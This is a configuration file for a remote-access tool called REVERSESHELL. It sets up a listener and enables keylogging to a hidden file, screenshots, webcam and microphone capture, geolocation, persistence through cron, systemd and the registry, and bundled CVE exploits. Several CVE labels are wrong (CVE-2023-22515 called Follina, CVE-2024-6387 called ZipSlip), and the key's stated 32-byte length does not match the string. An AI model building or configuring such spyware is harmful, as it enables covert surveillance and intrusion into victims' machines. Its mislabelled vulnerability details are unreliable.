# REVERSESHELL Configuration

# Network Settings
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 9999

# Encryption
ENCRYPTION_KEY = b"REVERSE_SHELL_KEY_2026"  # 32 bytes for AES-256

# Proxy Settings
PROXY = None  # Format: "http://user:pass@host:port" or "socks5://host:port"
PROXY_CHAINS = True  # Use proxychains if available

# UI Settings
THEME = {
    "bg": "#1e1e2e",
    "fg": "#cdd6f4",
    "accent": "#89b4fa",
    "success": "#a6e3a1",
    "error": "#f38ba8",
    "warning": "#f9e2af",
    "panel": "#313244",
    "button": "#89b4fa",
    "button_hover": "#b4befe"
}

# Features
ENABLE_FILE_TRANSFER = True
ENABLE_PROCESS_LIST = True
ENABLE_SCREENSHOT = True
ENABLE_KEYLOG = True
ENABLE_WEBCAM = True
ENABLE_MICROPHONE = True
ENABLE_GEOLOCATION = True
ENABLE_PERSISTENCE = True
ENABLE_CVE_EXPLOITS = True

# Keylogger Settings
KEYLOG_INTERVAL = 5  # Send keylog every N seconds
KEYLOG_FILE = "/tmp/.rs_keys.log"

# Screenshot Settings
SCREENSHOT_QUALITY = 85  # JPEG quality
SCREENSHOT_INTERVAL = 30  # Seconds between screenshots

# Webcam Settings
WEBCAM_RESOLUTION = (640, 480)
WEBCAM_FPS = 15

# Microphone Settings
MICROPHONE_CHUNK = 1024
MICROPHONE_RATE = 44100
MICROPHONE_FORMAT = 16  # 16-bit
MICROPHONE_CHANNELS = 1

# Persistence Settings
PERSISTENCE_METHOD = "all"  # "cron", "rc", "systemd", "registry", "all"

# CVE Exploits to include
CVE_EXPLOITS = [
    "MS17-010",      # EternalBlue
    "CVE-2019-0708", # BlueKeep
    "CVE-2021-44228",# Log4Shell
    "CVE-2023-22515",# Follina
    "CVE-2024-6387", # ZipSlip
]
